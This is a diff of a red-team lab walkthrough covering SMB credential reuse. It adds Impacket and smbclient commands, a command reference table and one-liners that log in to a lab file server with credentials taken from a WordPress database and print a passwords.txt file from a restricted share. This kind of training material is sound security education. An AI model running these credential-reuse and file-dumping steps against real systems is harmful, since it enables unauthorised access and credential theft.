@@ -275,32 +275,40 @@ However, let's first test if any of these credentials work on any accessible ser
 
 ### 3.2 Testing SMB Access
 
-Let's see if there's a file server accessible from the DMZ that uses these same credentials. We'll use Impacket tools for this - they're more powerful and commonly used in red team engagements.
+Let's see if there's a file server accessible that uses these same credentials. This tests for **credential reuse** - one of the most common attack vectors.
+
+**Method 1: Using Impacket (Recommended for Red Team)**
 
 ```bash
-# First, check if we can reach internal hosts (we're simulating pivoting)
-# In this lab, the networks are connected for training purposes
-
 # Connect to the file server with impacket-smbclient
 impacket-smbclient 'svc_backup:Backup2024!@172.16.2.10'
 ```
-
-**What you're doing:** Testing if the `svc_backup` credentials from the WordPress database also work on the file server (credential reuse attack).
 
 Once connected, list available shares:
 ```
 # shares
 ```
 
+**Method 2: Using Standard smbclient**
+
+```bash
+# List shares with standard smbclient
+smbclient -L //172.16.2.10 -U 'svc_backup%Backup2024!'
+```
+
+**What you're doing:** Testing if the `svc_backup` credentials from the WordPress database also work on the file server (credential reuse attack).
+
 **Expected result:** You should see shares including:
 - `public` - Open to everyone
 - `sensitive` - Restricted (but svc_backup has access!)
+- `accounting` - Financial documents
 - `IPC$` - Inter-process communication
 
 ### 3.3 Accessing Sensitive Files
 
+**Method 1: Using Impacket**
+
 ```bash
-# Connect and access the sensitive share
 impacket-smbclient 'svc_backup:Backup2024!@172.16.2.10'
 ```
 
@@ -311,17 +319,33 @@ Once connected, explore the contents:
 # cat passwords.txt
 ```
 
-**Impacket vs traditional smbclient:** Impacket tools use a different command syntax:
-- `use <share>` - Connect to a share
-- `ls` - List files
-- `cat <file>` - Display file contents (no need to download first!)
-- `get <file>` - Download a file
-- `exit` - Disconnect
+**Method 2: Using Standard smbclient**
 
-Alternative one-liner to dump the file:
 ```bash
-# Pipe commands to impacket-smbclient
+# List files in the sensitive share
+smbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024!' -c 'ls'
+
+# Read passwords.txt directly to stdout
+smbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024!' -c 'get passwords.txt -'
+```
+
+**Command Reference:**
+
+| Impacket | smbclient | Description |
+|----------|-----------|-------------|
+| `shares` | `-L //host` | List shares |
+| `use <share>` | `//host/share` | Connect to share |
+| `ls` | `-c 'ls'` | List files |
+| `cat <file>` | `-c 'get file -'` | Display contents |
+| `get <file>` | `-c 'get file'` | Download file |
+
+**One-liner alternatives:**
+```bash
+# Impacket
 echo -e 'use sensitive\ncat passwords.txt\nexit' | impacket-smbclient 'svc_backup:Backup2024!@172.16.2.10'
+
+# Standard smbclient
+smbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024!' -c 'get passwords.txt -'
 ```
 
 ### 3.4 Critical Discovery
